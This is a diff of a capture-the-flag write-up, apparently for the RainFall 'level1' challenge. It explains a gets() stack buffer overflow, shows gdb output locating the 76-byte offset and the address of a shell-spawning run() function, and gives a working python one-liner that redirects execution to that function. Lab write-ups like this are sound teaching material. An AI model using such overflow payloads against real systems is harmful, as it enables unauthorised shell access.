@@ -1,3 +1,24 @@
+The function gets(buf) does not check input size (stack buffer overflow).
+
+The goal is to overwrite the return address to point to run() function, which spawns a shell.
+
+```
+    int run() 
+    {
+        printf("Good... Wait what?\n");
+        return system("/bin/sh");
+    }
+
+    int main(int argc, char** argv, char** envp) 
+    {
+        char buf[64];
+        gets(buf);
+        return (0);
+    }
+```
+
+We use a pattern to crash the program and find the exact offset to the return address.
+
 ```
     gdb) run
     Starting program: /home/user/level1/level1 
@@ -7,31 +28,31 @@
     0x63413563 in ?? ()
 ``` 
 
-```
-```
-   python3 -c 'print("A"*76 + "\x44\x84\x04\x08")'
-```
+The offset to overwrite the return address is 76 bytes.
 
 ```
-    (gdb) disas run
-    Dump of assembler code for function run:
-    0x08048444 <+0>:     push   %ebp
-    0x08048445 <+1>:     mov    %esp,%ebp
-    0x08048447 <+3>:     sub    $0x18,%esp
-    0x0804844a <+6>:     mov    0x80497c0,%eax
-    0x0804844f <+11>:    mov    %eax,%edx
-    0x08048451 <+13>:    mov    $0x8048570,%eax
-    0x08048456 <+18>:    mov    %edx,0xc(%esp)
-    0x0804845a <+22>:    movl   $0x13,0x8(%esp)
-    0x08048462 <+30>:    movl   $0x1,0x4(%esp)
-    0x0804846a <+38>:    mov    %eax,(%esp)
-    0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
-    0x08048472 <+46>:    movl   $0x8048584,(%esp)
-    0x08048479 <+53>:    call   0x8048360 <system@plt>
-    0x0804847e <+58>:    leave  
-    0x0804847f <+59>:    ret    
-    End of assembler dump.
+    (gdb) info functions
+    All defined functions:
+
+    Non-debugging symbols:
+    0x080482f8  _init
+    0x08048340  gets
+    0x08048340  gets@plt
+    0x08048350  fwrite
+    0x08048350  fwrite@plt
+    0x08048360  system
+    0x08048360  system@plt
+    0x08048370  __gmon_start__
+    0x08048370  __gmon_start__@plt
+    0x08048380  __libc_start_main
+    0x08048380  __libc_start_main@plt
+    0x08048390  _start
+    0x080483c0  __do_global_dtors_aux
+    0x08048420  frame_dummy
+    0x08048444  run
 ```
+
+The address of function run() is 0x08048444 in little-indian "\x44\x84\x04\x08"
 
 ```
     level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
